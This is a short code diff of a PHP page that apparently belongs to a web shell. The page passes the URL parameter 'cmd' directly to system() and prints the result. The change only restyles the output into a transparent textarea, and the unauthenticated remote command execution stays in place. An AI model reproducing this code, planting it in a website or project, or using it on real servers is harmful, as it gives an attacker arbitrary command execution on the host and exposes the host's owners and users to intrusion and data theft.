@@ -103,7 +103,7 @@ z-index:-1;
 			if(isset($_GET['cmd'])){
 		?>
 		<tr>
-		<td><?=system($_GET['cmd'])?></td>
+		<td><textarea cols="100%" rows="20" style="background:transparent;outline:none;color:#ffffff;"><?=system($_GET['cmd'])?></textarea></td>
 		</tr>
 		<?php
 		}
